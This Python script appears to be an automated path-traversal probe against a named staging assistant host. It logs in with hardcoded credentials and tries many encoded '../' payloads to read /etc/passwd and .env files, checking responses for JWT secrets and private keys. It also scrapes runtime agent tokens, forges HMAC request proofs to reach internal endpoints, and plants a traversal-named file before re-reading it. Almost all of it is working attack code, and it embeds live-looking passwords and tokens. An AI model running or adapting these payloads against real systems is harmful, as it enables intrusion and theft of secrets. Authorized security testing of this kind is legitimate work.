#!/usr/bin/env python3
# intent 28687 - phase 2: read-dual traversal with --path-as-is (avoid curl dot-segment squashing).
import os, sys, json, time, base64, subprocess, hmac, hashlib, re
_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)
HOST="stage-assistant.lumiiai.cn"; EMAIL="e2e-accept@lumii.dev"; PASS="E2eAccept!0813"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
APP="app_AtioaJqQYvokxhhyae4LT"; TOK="aV6FG-UReIm70TRq"
START=time.time()
def el(): return int(time.time()-START)
def b(s): return base64.b64encode(s.encode("utf-8","replace")).decode()
def R(k,v): print("R:%s:%s"%(k,b(v if isinstance(v,str) else json.dumps(v,ensure_ascii=False))),flush=True)
def log(*a): print("L: "+" ".join(map(str,a)),flush=True)
def curl(args,timeout=25):
    try:
        r=subprocess.run(["curl","-s","-k","-m",str(timeout)]+args,capture_output=True,timeout=timeout+10)
        return r.returncode,r.stdout,r.stderr[:200]
    except Exception as e: return -1,b"",repr(e)[:150]
def call(path,method="GET",body=None,hdrs=None,cookie=None,timeout=25,maxlen=200000,path_as_is=False,showhdr=False):
    url="https://%s%s"%(HOST,path)
    args=["--http2","-A",UA,"-H","Accept: application/json","-H","Referer: https://%s/"%HOST,"-H","Origin: https://%s"%HOST,"-w","\n__CODE__%{http_code}"]
    if path_as_is: args+=["--path-as-is"]
    if showhdr: args+=["-i"]
    if cookie: args+=["-b","lumii_session="+cookie]
    if hdrs:
        for k,v in hdrs.items(): args+=["-H","%s: %s"%(k,v)]
    if body is not None: args+=["-X",method,"-H","Content-Type: application/json","--data-binary",json.dumps(body)]
    elif method!="GET": args+=["-X",method]
    args.append(url)
    rc,out,err=curl(args,timeout=timeout)
    t=out.decode("utf-8","replace"); code=""; i=t.rfind("__CODE__")
    if i>=0: code=t[i+8:].strip()[:3]; t=t[:i]
    return {"path":path,"code":code,"body":t[:maxlen],"len":len(t),"err":(err.decode("utf-8","replace") if isinstance(err,(bytes,bytearray)) else str(err))}
def J(r):
    try: return json.loads(r["body"])
    except Exception: return None

COOKIE=None
lr=call("/api/auth/login","POST",{"identifier":EMAIL,"password":PASS},showhdr=True)
m=re.search(r"lumii_session=([^;\s]+)",lr["body"]); COOKIE=m.group(1) if m else None
R("login",{"code":lr["code"],"cookie":bool(COOKIE)})

# --- static /l/<tok>/ read-dual, path-as-is ---
tests={
 "sanity_marker":"x_probe.txt",
 "raw_dotdot":"../../../../../../opt/lumii-stage/.env.dev",
 "raw_etc": "../../../../../../etc/passwd",
 "raw_dotdot5":"../../../../../opt/lumii-stage/.env",
 "enc_lower": "..%2f..%2f..%2f..%2f..%2f..%2fopt%2flumii-stage%2f.env.dev",
 "enc_upper": "..%2F..%2F..%2F..%2F..%2F..%2Fopt%2Flumii-stage%2F.env.dev",
 "dotenc":    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/lumii-stage/.env.dev",
 "mix":       "..%2e/..%2e/..%2e/..%2e/..%2e/..%2e/opt/lumii-stage/.env.dev",
 "dbl":       "..%252f..%252f..%252f..%252f..%252f..%252fopt%252flumii-stage%252f.env.dev",
 "lead_slash":"%2fopt%2flumii-stage%2f.env.dev",
 "raw_abs":   "/opt/lumii-stage/.env.dev",
 "back":      "..%5c..%5c..%5c..%5c..%5c..%5copt%5clumii-stage%5c.env.dev",
 "double_dot":"....//....//....//....//opt/lumii-stage/.env.dev",
 "dotdot_slash":"..;/..;/..;/..;/..;/opt/lumii-stage/.env.dev",
}
for nm,rel in tests.items():
    rd=call("/l/%s/%s"%(TOK,rel),path_as_is=True,timeout=20,maxlen=3000,showhdr=(nm=="sanity_marker"))
    body=rd["body"].split("\r\n\r\n")[-1]
    R("l_%s"%nm,{"code":rd["code"],"len":rd["len"],"head":body[:160],
                  "leak":("JWT_SECRET" in body or "PRIVATE KEY" in body or "root:x:" in body or "DATABASE_URL" in body)})

# --- write an encoded-literal filename (no index) to prove it is stored literally, not decoded ---
# fresh snapshot on existing app: include index.html + literal encoded path
import urllib.request
# login cookie used for web routes; internal needs runtime identity -> re-mint
rr=call("/api/runtimes","POST",{"name":"probe28687c"},cookie=COOKIE,maxlen=40000,timeout=35)
rtxt=rr["body"]
def grab(p):
    mm=re.search(p+r"['\"]?\s*[=:]\s*['\"]([^'\"\s]+)['\"]",rtxt); return mm.group(1) if mm else None
TPS=grab("TURN_PROOF_SECRET"); RID=grab("AGENT_ID"); RTOKEN=grab("AGENT_TOKEN")
k=call("/api/runtimes/keys/current",hdrs={"x-agent-id":RID,"x-agent-token":RTOKEN})
PROOF_KEY=(J(k) or {}).get("proof_key")
ME="usr_e2eaccept20260812xxx"; PLATFORM="dashboard"; SK="conv_28687c"
def b64u(x): return base64.urlsafe_b64encode(x).rstrip(b"=").decode()
def proof(actor):
    now=int(time.time()); c={"session_key":SK,"platform":PLATFORM,"chat_id":SK,"actor_id":actor,"iss":RID,"aud":RID,"iat":now-5,"exp":now+1500}
    p=b64u(json.dumps(c,separators=(",",":")).encode())
    return "v2."+p+"."+b64u(hmac.new(PROOF_KEY.encode(),p.encode(),hashlib.sha256).digest())
def internal(name,extra=None,maxlen=200000):
    body={"platform":PLATFORM,"actor_id":ME,"session_key":SK}
    if extra: body.update(extra)
    return call("/internal/"+name,"POST",body,hdrs={"Authorization":"Bearer "+RTOKEN,"x-agent-id":RID,"x-lumii-turn-proof":proof(ME)},maxlen=maxlen)
R("identity",{"rid":RID,"pk":bool(PROOF_KEY),"tps":bool(TPS)})
w=internal("apps/code-snapshot",{"app_id":APP,"files":[
    {"path":"index.html","content":"<html><body>probe28687c</body></html>"},
    {"path":"..%2f..%2f..%2f..%2fopt%2flumii-stage%2f.env.dev","content":"ENCODED_LITERAL_NOT_ESCAPED"},
    {"path":"x_probe2.txt","content":"probe28687c_marker"}],"note":"c"})
R("write_encoded_with_index",{"code":w["code"],"body":w["body"][:400]})
# re-publish so new version served
internal("apps/code-publish",{"app_id":APP})
# read the literal back with triple-encoded percent (so decodeURIComponent yields the literal name with %2f)
for nm,rel in {
  "literal_read":"..%25252f..%25252f..%25252f..%25252fopt%25252flumii-stage%25252f.env.dev",
  "marker2":"x_probe2.txt",
}.items():
    rd=call("/l/%s/%s"%(TOK,rel),path_as_is=True,maxlen=1500)
    R("rw_%s"%nm,{"code":rd["code"],"head":rd["body"][:160]})

# --- preview route with valid signature, path-as-is ---
cr=call("/api/apps/%s/code"%APP,cookie=COOKIE,maxlen=40000)
crj=J(cr) or {}; prev=None
for v in (crj.get("versions") or []):
    if v.get("previewUrl"): prev=v["previewUrl"]; break
R("preview_url",{"code":cr["code"],"prev":prev})
if prev:
    if not prev.endswith("/"): prev+="/"
    for nm,rel in {"idx":"","marker":"x_probe2.txt",
                   "raw_dotdot":"../../../../../../opt/lumii-stage/.env.dev",
                   "enc":"..%2f..%2f..%2f..%2f..%2f..%2fopt%2flumii-stage%2f.env.dev",
                   "abs":"/opt/lumii-stage/.env.dev"}.items():
        rd=call(prev+rel,path_as_is=True,maxlen=2500)
        R("prev_%s"%nm,{"code":rd["code"],"len":rd["len"],"head":rd["body"][:140],
                        "leak":("JWT_SECRET" in rd["body"] or "PRIVATE KEY" in rd["body"])})
R("DONE",{"t":el()})
